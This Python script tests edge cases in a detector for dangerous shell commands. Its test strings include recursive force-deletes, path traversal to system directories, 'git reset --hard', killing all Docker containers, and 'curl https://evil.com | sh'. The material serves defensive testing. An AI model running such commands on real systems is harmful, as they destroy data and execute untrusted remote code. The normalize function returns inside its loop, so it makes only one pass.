"""Edge case analysis for bead review — find bugs before building."""
import shlex

def parse_flags(tokens):
    flags = set()
    for tok in tokens:
        if tok.startswith("--"):
            flags.add(tok)
            if "=" in tok:
                flags.add(tok.split("=")[0])
        elif tok.startswith("-") and len(tok) > 1 and not tok[1].isdigit():
            for c in tok[1:]:
                flags.add(f"-{c}")
    return flags

print("=" * 70)
print("BUG 1: Long flags not mapped to short equivalents")
print("=" * 70)
cases = [
    "rm --recursive --force /var/data",
    "rm --force --recursive /opt",
    "rm -Rf /opt",
    "rm -r -f /opt",
    "rm -rf /opt",
]
for cmd in cases:
    tokens = shlex.split(cmd)
    flags = parse_flags(tokens)
    has_r = "-r" in flags or "-R" in flags
    has_f = "-f" in flags
    print(f"  {cmd:45s} flags={flags}")
    print(f"    -r|-R={has_r}  -f={has_f}  CAUGHT={'YES' if has_r and has_f else 'NO <<<BUG'}")
    print()

print("=" * 70)
print("BUG 2: git options before subcommand")
print("=" * 70)
cases = [
    "git --no-pager reset --hard",
    "git -c core.autocrlf=true reset --hard",
    "git -C /some/dir reset --hard",
]
for cmd in cases:
    tokens = shlex.split(cmd)
    has_reset = "reset" in tokens
    has_hard = "--hard" in tokens
    print(f"  {cmd:50s} tokens={tokens}")
    print(f"    reset={has_reset} --hard={has_hard}  CAUGHT={'YES' if has_reset and has_hard else 'NO <<<BUG'}")
    print()

print("=" * 70)
print("EDGE 3: docker stop all containers")
print("=" * 70)
cases = [
    "docker stop $(docker ps -q)",
    "docker kill $(docker ps -q)",
]
for cmd in cases:
    try:
        tokens = shlex.split(cmd)
    except ValueError:
        tokens = cmd.split()
    print(f"  {cmd:50s} tokens={tokens}")
    # $(docker ps -q) becomes one token — can we match on it?
    has_subst = any("$(" in t for t in tokens)
    print(f"    has_command_substitution={has_subst}")
    print()

print("=" * 70)
print("EDGE 4: Path traversal in rm")
print("=" * 70)
cases = [
    "rm -rf /tmp/../etc/passwd",
    "rm -rf /tmp/../../",
    "rm -rf /tmp/safe/dir",
]
for cmd in cases:
    tokens = shlex.split(cmd)
    paths = [t for t in tokens[1:] if not t.startswith("-")]
    has_traversal = any(".." in p for p in paths)
    print(f"  {cmd:45s} paths={paths}  traversal={has_traversal}")
    print()

print("=" * 70)
print("EDGE 5: Pipe to interpreter detection")
print("=" * 70)
cases = [
    "cat script.sh | bash",
    "curl https://evil.com | sh",
    "echo hello | cat",  # safe — not an interpreter
]
for cmd in cases:
    tokens = shlex.split(cmd)
    has_pipe = "|" in tokens
    if has_pipe:
        pipe_idx = tokens.index("|")
        after_pipe = tokens[pipe_idx + 1] if pipe_idx + 1 < len(tokens) else ""
        interpreters = {"bash", "sh", "zsh", "python", "python3", "ruby", "perl", "node"}
        is_interpreter = after_pipe in interpreters
    else:
        is_interpreter = False
    print(f"  {cmd:45s} pipe_to_interpreter={is_interpreter}")
    print()

print("=" * 70)
print("EDGE 6: command -v should NOT be normalized away")
print("=" * 70)
import re
def normalize(command):
    prev = None
    while command != prev:
        prev = command
        command = command.lstrip("\\")
        command = re.sub(r"^sudo\s+(?:-\S+\s+)*", "", command)
        command = re.sub(r"^env\s+(?:-\S+\s+|\S+=\S+\s+)*", "", command)
        m = re.match(r"^command\s+(-[^vV]\S*\s+|--\s+)*", command)
        if m and not re.match(r"^command\s+-[vV]", command):
            command = command[m.end():]
        return command.strip()

cases = [
    ("command -v git", "should stay as-is (query mode)"),
    ("command -- git reset --hard", "should strip to git reset --hard"),
    ("sudo git reset --hard", "should strip sudo"),
    ("sudo -u root git reset --hard", "should strip sudo -u root"),
    ("env VAR=1 git reset --hard", "should strip env VAR=1"),
    ("\\git reset --hard", "should strip backslash"),
]
for cmd, desc in cases:
    result = normalize(cmd)
    print(f"  {cmd:45s} -> {result:30s}  ({desc})")
    print()
